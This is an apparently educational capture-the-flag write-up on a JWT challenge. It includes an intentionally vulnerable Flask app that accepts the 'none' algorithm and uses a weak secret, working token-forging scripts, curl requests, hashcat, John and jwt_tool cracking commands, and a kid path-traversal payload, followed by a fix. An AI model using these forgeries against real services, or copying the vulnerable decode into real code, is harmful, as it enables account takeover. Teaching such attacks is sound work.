---
title: "Web - JWT Cracking"
description: "Exploiting JWT vulnerabilities including the none algorithm attack and weak HMAC secret cracking to forge admin tokens and capture the flag."
author: "Zemi"
---

## Challenge Info

| Detail     | Value              |
|------------|--------------------|
| Category   | Web Exploitation   |
| Difficulty | Medium             |
| Points     | 250                |
| Flag       | `zemi{jwt_n0n3_4lg0_h4ck}` |

## Challenge Files

Download the challenge files to get started:

- [app.py](/Website/challenges/web-jwt-cracking/app.py)
- [flag.txt](/Website/challenges/web-jwt-cracking/flag.txt)
- [README.md](/Website/challenges/web-jwt-cracking/README.md)
- [requirements.txt](/Website/challenges/web-jwt-cracking/requirements.txt)

## Overview

JSON Web Tokens (JWTs) are a widely used authentication mechanism. A JWT is a signed token that contains user identity claims. The server issues the token on login, and the client sends it with subsequent requests to prove identity. If the signing mechanism is broken, an attacker can forge tokens and impersonate any user.

## JWT Structure

A JWT consists of three Base64url-encoded parts separated by dots:

```
header.payload.signature
```

For example:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiIHVzZXIifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

| Part | Decoded Content | Purpose |
|------|----------------|---------|
| Header | `{"alg":"HS256","typ":"JWT"}` | Specifies the signing algorithm |
| Payload | `{"user":"guest","role":"user"}` | Contains the claims (user data) |
| Signature | `HMACSHA256(base64url(header) + "." + base64url(payload), secret)` | Integrity verification |

## Setting Up the Challenge Locally

Save the following as `app.py` and run it with `python3 app.py`:

```python
from flask import Flask, request, jsonify, make_response
import jwt
import datetime
import base64
import json

app = Flask(__name__)
SECRET_KEY = "password1"  # Intentionally weak secret

@app.route("/")
def index():
    return """
    <h1>JWT Auth Portal</h1>
    <p>POST /login with {"username": "guest", "password": "guest"}</p>
    <p>GET /admin with Authorization: Bearer &lt;token&gt;</p>
    """

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    username = data.get("username", "")
    password = data.get("password", "")

    # Simple auth check
    valid_users = {"guest": "guest", "admin": "supersecretpassword"}
    if username not in valid_users or valid_users[username] != password:
        return jsonify({"error": "Invalid credentials"}), 401

    # Generate JWT
    payload = {
        "user": username,
        "role": "admin" if username == "admin" else "user",
        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)
    }
    token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
    return jsonify({"token": token})

@app.route("/admin")
def admin():
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        return jsonify({"error": "Missing token"}), 401

    token = auth.split(" ")[1]

    try:
        # VULNERABLE: accepts multiple algorithms including 'none'
        decoded = jwt.decode(token, SECRET_KEY, algorithms=["HS256", "none"])
    except jwt.ExpiredSignatureError:
        return jsonify({"error": "Token expired"}), 401
    except jwt.InvalidTokenError as e:
        return jsonify({"error": f"Invalid token: {str(e)}"}), 401

    if decoded.get("role") != "admin":
        return jsonify({"error": "Admin access required", "your_role": decoded.get("role")}), 403

    return jsonify({
        "message": "Welcome, admin!",
        "flag": "zemi{jwt_n0n3_4lg0_h4ck}",
        "user": decoded
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

> **Note:** This challenge requires `PyJWT` version 1.x or a deliberately vulnerable implementation. Modern PyJWT (v2+) rejects `"none"` by default. Install the older version with `pip install PyJWT==1.7.1` to reproduce the none-algorithm vulnerability.

## Reconnaissance

### Step 1: Login and get a token

```bash
curl -s -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest"}' | python3 -m json.tool
```

Response:

```json
{
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImV4cCI6MTcwNjMwMDAwMH0.abc123..."
}
```

### Step 2: Try accessing the admin endpoint

```bash
curl -s http://localhost:5000/admin \
  -H "Authorization: Bearer eyJhbGci..." | python3 -m json.tool
```

Response:

```json
{
    "error": "Admin access required",
    "your_role": "user"
}
```

We need `role: admin` in the token. Time to attack the JWT.

### Step 3: Decode the token

A JWT can be decoded without knowing the secret — the payload is just Base64:

```python
#!/usr/bin/env python3
"""Decode a JWT without verification."""

import base64
import json
import sys

def decode_jwt(token):
    parts = token.split(".")
    if len(parts) != 3:
        print("Invalid JWT format")
        return

    # Base64url decode (add padding if needed)
    for i, name in enumerate(["Header", "Payload"]):
        part = parts[i]
        part += "=" * (4 - len(part) % 4)  # Add padding
        decoded = base64.urlsafe_b64decode(part)
        data = json.loads(decoded)
        print(f"{name}: {json.dumps(data, indent=2)}")

    print(f"Signature: {parts[2][:20]}...")

if __name__ == "__main__":
    token = sys.argv[1]
    decode_jwt(token)
```

Running it:

```bash
python3 decode_jwt.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImV4cCI6MTcwNjMwMDAwMH0.abc123"
```

Output:

```
Header: {
  "alg": "HS256",
  "typ": "JWT"
}
Payload: {
  "user": "guest",
  "role": "user",
  "exp": 1706300000
}
Signature: abc123...
```

We can see the algorithm is `HS256` and our role is `user`. Two attack paths are available.

## Exploitation — Attack 1: The "none" Algorithm

The JWT spec includes an `"alg": "none"` option that means "no signature required." If a server accepts `none` as a valid algorithm, we can forge any token without knowing the secret.

### Forge a token with none algorithm

```python
#!/usr/bin/env python3
"""Forge a JWT with the 'none' algorithm."""

import base64
import json

def b64url_encode(data):
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b"=").decode()

# Craft the header with alg: none
header = {"alg": "none", "typ": "JWT"}

# Craft the payload with admin role
payload = {
    "user": "admin",
    "role": "admin",
    "exp": 9999999999  # Far future expiration
}

# Build the token: header.payload. (empty signature)
token = f"{b64url_encode(header)}.{b64url_encode(payload)}."
print(f"Forged token:\n{token}")
```

Running it:

```bash
python3 forge_none.py
```

Output:

```
Forged token:
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VyIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4iLCAiZXhwIjogOTk5OTk5OTk5OX0.
```

Note the trailing dot — the signature is empty.

### Use the forged token

```bash
curl -s http://localhost:5000/admin \
  -H "Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VyIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4iLCAiZXhwIjogOTk5OTk5OTk5OX0." \
  | python3 -m json.tool
```

Response:

```json
{
    "message": "Welcome, admin!",
    "flag": "zemi{jwt_n0n3_4lg0_h4ck}",
    "user": {
        "user": "admin",
        "role": "admin",
        "exp": 9999999999
    }
}
```

The flag is `zemi{jwt_n0n3_4lg0_h4ck}`.

## Exploitation — Attack 2: Cracking a Weak HMAC Secret

Even if the `none` algorithm is not accepted, many applications use weak secrets for HMAC signing. If we can crack the secret, we can sign our own tokens.

### Using hashcat

```bash
# Save the token to a file
echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImV4cCI6MTcwNjMwMDAwMH0.abc123..." > jwt.txt

# Crack with hashcat (mode 16500 = JWT)
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

### Using John the Ripper

```bash
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
```

### Using jwt_tool

[jwt_tool](https://github.com/ticarpi/jwt_tool) is a purpose-built JWT testing tool:

```bash
# Install
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
pip install -r requirements.txt

# Crack the secret
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
```

Output:

```
[+] SECRET FOUND: password1
```

### Forge a new token with the cracked secret

```python
#!/usr/bin/env python3
"""Forge a JWT with a known secret."""

import jwt
import datetime

SECRET = "password1"  # Cracked secret

payload = {
    "user": "admin",
    "role": "admin",
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)
}

token = jwt.encode(payload, SECRET, algorithm="HS256")
print(f"Forged token: {token}")
```

```bash
python3 forge_signed.py
# Then use the token:
curl -s http://localhost:5000/admin \
  -H "Authorization: Bearer <forged-token>" | python3 -m json.tool
```

## Other JWT Attacks to Know

### Algorithm Confusion (RS256 to HS256)

If the server uses RS256 (asymmetric) but also accepts HS256 (symmetric), you can:
1. Download the server's public RSA key
2. Sign a token using HS256 with the public key as the HMAC secret
3. The server verifies the HMAC using its public key (which it already has) and accepts the token

### JWK Header Injection

Some libraries allow embedding a key directly in the JWT header via the `jwk` parameter. An attacker can:
1. Generate their own key pair
2. Sign the token with their private key
3. Embed their public key in the JWT header
4. The server uses the embedded key to verify — which of course passes

### kid Parameter Injection

The `kid` (Key ID) header can sometimes be injected with path traversal or SQL injection:

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../dev/null"
}
```

If the server reads the key file specified by `kid`, pointing it to `/dev/null` (empty file) means the secret is an empty string.

## The Vulnerable Code (Explained)

```python
# VULNERABLE: Accepts 'none' as a valid algorithm
decoded = jwt.decode(token, SECRET_KEY, algorithms=["HS256", "none"])
```

The fatal mistake is including `"none"` in the accepted algorithms list.

## The Fix

```python
import jwt

@app.route("/admin")
def admin():
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        return jsonify({"error": "Missing token"}), 401

    token = auth.split(" ")[1]

    try:
        # FIX: Only accept the specific algorithm you use
        # Never include 'none' in the algorithms list
        decoded = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        return jsonify({"error": "Token expired"}), 401
    except jwt.InvalidTokenError:
        return jsonify({"error": "Invalid token"}), 401

    if decoded.get("role") != "admin":
        return jsonify({"error": "Forbidden"}), 403

    return jsonify({"message": "Welcome, admin!"})
```

Additional security measures:
1. **Use a strong, random secret** — at least 256 bits of entropy, not a dictionary word
2. **Explicitly specify accepted algorithms** — never use a permissive algorithm list
3. **Use RS256 (asymmetric) instead of HS256** when possible — the private key stays on the server, the public key is distributed for verification
4. **Set short token lifetimes** and implement token refresh
5. **Upgrade PyJWT** — version 2.x rejects `none` by default and requires explicit algorithm specification

## Tools Used

- **curl** — sending HTTP requests with custom headers
- **Python + PyJWT** — decoding and forging tokens
- **hashcat** — brute forcing JWT HMAC secrets (mode 16500)
- **John the Ripper** — alternative tool for secret cracking
- **jwt_tool** — comprehensive JWT attack tool
- **jwt.io** — web-based JWT decoder for quick inspection

## Lessons Learned

- JWTs are **signed**, not encrypted — anyone can read the payload by Base64 decoding it
- The `none` algorithm attack exploits servers that do not restrict which algorithms they accept
- Weak HMAC secrets can be cracked offline with wordlists — use strong, random secrets
- Always specify an explicit algorithm allowlist when verifying JWTs
- Keep JWT libraries up to date — modern versions have built-in protections against common attacks
- Never trust the `alg` field in the token header — the server should dictate which algorithm to use, not the client
